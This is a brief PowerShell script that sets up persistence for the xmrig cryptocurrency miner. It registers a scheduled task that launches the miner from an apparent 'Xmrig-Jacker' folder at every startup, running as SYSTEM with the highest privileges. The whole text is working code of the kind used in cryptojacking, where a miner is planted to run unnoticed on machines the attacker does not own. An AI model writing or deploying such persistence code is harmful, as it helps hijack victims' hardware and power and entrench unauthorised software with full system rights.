$xmrigPath = "C:\temp\Xmrig-Jacker-main\xmrig\xmrig.exe"

# Create a scheduled task action to run xmrig.exe
$action = New-ScheduledTaskAction -Execute $xmrigPath

# Create a trigger for the task to run on system startup
$trigger = New-ScheduledTaskTrigger -AtStartup

# Create a principal for the task to run with the highest privileges
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest

# Register the scheduled task
Register-ScheduledTask -TaskName "Run Xmrig" -Action $action -Trigger $trigger -Principal $principal -RunLevel Highest -Force
